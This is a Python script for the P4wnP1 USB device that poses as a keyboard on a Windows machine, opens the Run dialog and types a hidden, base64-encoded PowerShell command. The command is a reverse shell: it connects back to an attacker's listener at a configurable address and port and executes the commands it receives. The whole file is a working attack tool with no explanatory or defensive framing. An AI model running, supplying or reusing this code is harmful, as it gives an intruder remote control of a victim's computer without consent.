#!/usr/bin/env python3
import os, sys, time, base64, subprocess

P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from hid_type import win_r, type_string

def generate_b64_payload(lhost, lport):
    payload = rf"""
$client=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream=$client.GetStream();
$buffer=New-Object Byte[] 65535;
$enc=New-Object Text.ASCIIEncoding;
while(($i=$stream.Read($buffer,0,$buffer.Length)) -ne 0){{
  $data=$enc.GetString($buffer,0,$i);
  $send=(iex $data 2>&1 | Out-String) + 'PS ' + (Get-Location).Path + '> ';
  $sb=$enc.GetBytes($send);
  $stream.Write($sb,0,$sb.Length);
}}
$client.Close();
""".strip()
    return base64.b64encode(payload.encode("utf-16le")).decode()

def main():
    lhost = os.getenv("P4WN_LHOST", "192.168.1.133")
    lport = int(os.getenv("P4WN_LPORT", "4444"))
    b64 = generate_b64_payload(lhost, lport)

    print("[*] LHOST =", lhost, "LPORT =", lport)
    win_r(); time.sleep(0.5)
    type_string("powershell\n")
    time.sleep(0.8)
    type_string(f"powershell -nop -w hidden -enc {b64}\n")
    print("[*] Sent in-memory reverse shell.")

if __name__ == "__main__":
    main()
